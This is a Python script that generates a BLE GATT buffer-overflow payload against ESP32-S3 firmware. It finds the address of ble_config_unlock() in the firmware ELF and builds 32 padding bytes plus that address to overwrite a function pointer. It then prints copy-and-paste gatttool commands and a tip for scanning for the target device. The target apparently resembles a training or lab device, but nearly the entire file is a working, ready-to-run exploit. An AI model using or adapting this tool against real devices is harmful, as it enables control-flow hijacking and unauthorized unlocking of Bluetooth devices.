#!/usr/bin/env python3
"""
BLE GATT Buffer Overflow Exploit Generator

Generates a BLE GATT write payload that overflows a 32-byte buffer to
corrupt an adjacent function pointer. The overwritten pointer redirects
execution to the ble_config_unlock() function (or any specified target).

The payload structure:
  [32 bytes padding] [4-byte little-endian target address]

The tool can extract the target function address automatically from an
ELF binary using nm/objdump, or accept a manual address via --address.

Outputs the payload as hex suitable for gatttool --char-write-req, along
with a ready-to-paste gatttool command line.
"""

import argparse
import os
import struct
import subprocess
import sys


def find_function_address(elf_path, function_name):
    """Extract function address from ELF binary using nm or objdump."""
    # Try xtensa-esp32s3-elf-nm first (PlatformIO toolchain)
    nm_tools = [
        "xtensa-esp32s3-elf-nm",
        os.path.expanduser(
            "~/.platformio/packages/toolchain-xtensa-esp32s3/bin/"
            "xtensa-esp32s3-elf-nm"
        ),
    ]

    for nm_bin in nm_tools:
        try:
            result = subprocess.run(
                [nm_bin, elf_path],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[2] == function_name:
                        addr = int(parts[0], 16)
                        print(f"[+] Found {function_name} at 0x{addr:08X} "
                              f"(via {os.path.basename(nm_bin)})")
                        return addr
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    # Try generic nm as fallback
    try:
        result = subprocess.run(
            ["nm", elf_path],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                parts = line.strip().split()
                if len(parts) >= 3 and parts[2] == function_name:
                    addr = int(parts[0], 16)
                    print(f"[+] Found {function_name} at 0x{addr:08X} (via nm)")
                    return addr
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return None


def check_null_bytes(address_bytes, padding_size):
    """Warn if the address contains null bytes that would terminate sprintf."""
    for i, b in enumerate(address_bytes):
        if b == 0x00 and i < len(address_bytes) - 1:
            pos = padding_size + i
            print(f"[!] WARNING: Null byte (0x00) at payload offset {pos}")
            print(f"[!] sprintf will stop copying at this byte.")
            print(f"[!] Only {pos} bytes will be written to the buffer.")
            if pos < padding_size + 3:
                print(f"[!] The function pointer may not be fully overwritten.")
                print(f"[!] Consider an alternative exploitation technique.")
            return True
    return False


def main():
    parser = argparse.ArgumentParser(
        description="Generate BLE GATT buffer overflow payload to hijack a "
                    "function pointer. Builds a payload of padding bytes "
                    "followed by a little-endian target address.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --elf .pio/build/M5CoreS3/firmware.elf
      Auto-detect ble_config_unlock address from ELF and generate payload

  %(prog)s --address 0x4200D720
      Use a manually specified target address

  %(prog)s --address 0x4200D720 --device-mac 24:0A:C4:12:34:56
      Generate a complete gatttool command with the device MAC

  %(prog)s --elf firmware.elf --function unlockAdmin --padding-size 64
      Target a different function with a different buffer size

  %(prog)s --address 0x4200D720 --handle 0x0018
      Use a different GATT characteristic handle

How it works:
  The BLE GATT config characteristic onWrite callback contains a packed
  struct with a 32-byte char buffer followed by a function pointer.
  sprintf copies the written value into the buffer without bounds
  checking. By writing 32 bytes of padding plus 4 bytes of address,
  the function pointer is overwritten and called immediately after.
""")
    parser.add_argument(
        "--elf", metavar="PATH",
        help="Path to firmware ELF file to extract function address")
    parser.add_argument(
        "--function", default="ble_config_unlock",
        help="Target function name to find in ELF (default: ble_config_unlock)")
    parser.add_argument(
        "--padding-size", type=int, default=32,
        help="Buffer size / padding bytes before function pointer (default: 32)")
    parser.add_argument(
        "--address", metavar="HEX",
        help="Manual target address in hex (e.g., 0x4200D720)")
    parser.add_argument(
        "--handle", default="0x0016",
        help="GATT characteristic handle for the write (default: 0x0016)")
    parser.add_argument(
        "--device-mac", metavar="MAC",
        help="BLE MAC address of target device (e.g., 24:0A:C4:XX:XX:XX)")
    parser.add_argument(
        "--pad-byte", default="41",
        help="Hex byte used for padding (default: 41 = 'A')")

    args = parser.parse_args()

    # Determine target address
    target_addr = None

    if args.address:
        try:
            target_addr = int(args.address, 16)
            print(f"[+] Using manual address: 0x{target_addr:08X}")
        except ValueError:
            print(f"[-] Invalid hex address: {args.address}", file=sys.stderr)
            sys.exit(1)

    elif args.elf:
        if not os.path.isfile(args.elf):
            print(f"[-] ELF file not found: {args.elf}", file=sys.stderr)
            sys.exit(1)
        target_addr = find_function_address(args.elf, args.function)
        if target_addr is None:
            print(f"[-] Function '{args.function}' not found in {args.elf}",
                  file=sys.stderr)
            print(f"[-] Try: nm {args.elf} | grep {args.function}",
                  file=sys.stderr)
            sys.exit(1)

    else:
        print("[-] Provide either --elf or --address", file=sys.stderr)
        print("[-] Run with --help for usage examples", file=sys.stderr)
        sys.exit(1)

    # Build the payload
    pad_byte = bytes.fromhex(args.pad_byte)
    padding = pad_byte * args.padding_size
    addr_bytes = struct.pack("<I", target_addr)

    # Check for null byte issues with sprintf
    check_null_bytes(addr_bytes, args.padding_size)

    payload = padding + addr_bytes
    hex_payload = payload.hex()

    # Display results
    print()
    print("=" * 64)
    print("BLE GATT Buffer Overflow Payload")
    print("=" * 64)
    print(f"  Target function : {args.function}")
    print(f"  Target address  : 0x{target_addr:08X}")
    print(f"  Address (LE)    : {addr_bytes.hex()}")
    print(f"  Padding size    : {args.padding_size} bytes")
    print(f"  Total payload   : {len(payload)} bytes")
    print(f"  GATT handle     : {args.handle}")
    print()
    print(f"  Hex payload:")
    print(f"    {hex_payload}")
    print()

    # Show the breakdown
    print("  Payload breakdown:")
    print(f"    Bytes  0-{args.padding_size - 1:2d}: "
          f"{padding.hex()} (padding)")
    print(f"    Bytes {args.padding_size:2d}-{args.padding_size + 3:2d}: "
          f"{addr_bytes.hex()} "
          f"(0x{target_addr:08X} little-endian)")
    print()

    # Generate gatttool command
    mac_placeholder = args.device_mac if args.device_mac else "XX:XX:XX:XX:XX:XX"
    gatttool_cmd = (
        f"gatttool -b {mac_placeholder} --char-write-req "
        f"--handle={args.handle} --value={hex_payload}"
    )

    print("  gatttool command (copy and paste):")
    print(f"    {gatttool_cmd}")
    print()

    # Interactive mode command
    print("  gatttool interactive mode:")
    print(f"    gatttool -b {mac_placeholder} -I")
    print(f"    > connect")
    print(f"    > char-write-req {args.handle} {hex_payload}")
    print()

    # Python one-liner for quick generation
    print("  Python one-liner (for scripting):")
    print(f"    python3 -c \"print('{pad_byte.hex()}'"
          f"*{args.padding_size} + '{addr_bytes.hex()}')\"")
    print()

    if not args.device_mac:
        print("  [*] Tip: Add --device-mac to get a ready-to-run command")
        print("  [*] Find the MAC with: sudo hcitool lescan | grep CoreS3")


if __name__ == "__main__":
    main()
